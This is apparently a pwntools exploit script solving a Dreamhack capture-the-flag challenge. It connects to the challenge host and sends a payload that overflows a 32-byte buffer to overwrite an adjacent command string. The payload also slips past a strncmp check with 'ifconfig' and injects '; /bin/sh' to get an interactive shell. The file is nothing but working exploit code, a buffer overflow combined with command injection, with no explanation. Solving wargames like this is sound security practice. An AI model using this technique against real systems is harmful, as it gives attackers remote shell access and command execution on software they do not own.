from pwn import *

p = remote('host3.dreamhack.games', 15414)

payload = b'a' * 0x20    # &cmd_ip - &center_name = 0x20(32)
payload += b'ifconfig'   # strncmp 우회
payload += b'; /bin/sh'  # injection

p.sendafter(b'Center name: ', payload)

p.interactive()
